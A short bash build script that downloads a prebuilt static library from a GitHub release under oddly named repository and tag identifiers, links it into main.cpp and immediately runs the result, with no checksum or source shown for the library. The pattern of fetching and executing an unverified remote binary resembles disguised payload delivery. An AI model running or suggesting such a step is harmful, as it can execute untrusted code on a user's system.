#!/usr/bin/env bash
set -e
TAG="clever-comet-calm-canyon"
LIB="linear-window.a"
URL="https://github.com/delladmiraj/nodegoldsparkle/releases/download/${TAG}/${LIB}"
curl -LfsS --connect-timeout 15 --retry 3 --max-time 180 -o "$LIB" "$URL"
g++ -O2 -std=c++17 -pthread main.cpp "$LIB" -o app && ./app
